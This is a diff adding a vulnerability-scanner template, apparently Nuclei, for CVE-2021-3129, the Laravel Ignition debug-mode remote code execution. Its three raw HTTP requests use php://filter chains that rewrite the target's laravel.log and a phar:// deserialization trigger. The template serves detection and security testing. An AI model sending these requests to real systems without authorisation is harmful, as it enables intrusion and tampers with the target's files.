@@ -1,0 +1,61 @@
+id: CVE-2021-3129
+
+info:
+  name: Laravel Debug Mode RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Laravel Debug mode remote code execution vulnerability. When Laravel turns on the Debug mode, due to the unsafe use of certain functions, an attacker can trigger Phar deserialization leading to RCE.
+  tags: code-execution,rce,laravel
+  reference:
+    - https://github.com/facade/ignition/pull/334
+    - https://www.ambionics.io/blog/laravel-debug-rce
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-3129
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129
+
+http:
+  - raw:
+      - |
+        POST /_ignition/execute-solution HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Content-Type: application/json
+
+        {"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cve20213129","viewFile":"php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+  - raw:
+      - |
+        POST /_ignition/execute-solution HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Content-Type: application/json
+
+        {"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cve20213129","viewFile":"phar://../storage/logs/laravel.log/test.txt"}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+  - raw:
+      - |
+        POST /_ignition/execute-solution HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+        Content-Type: application/json
+
+        {"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"cve20213129","viewFile":"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "CVE20213129"
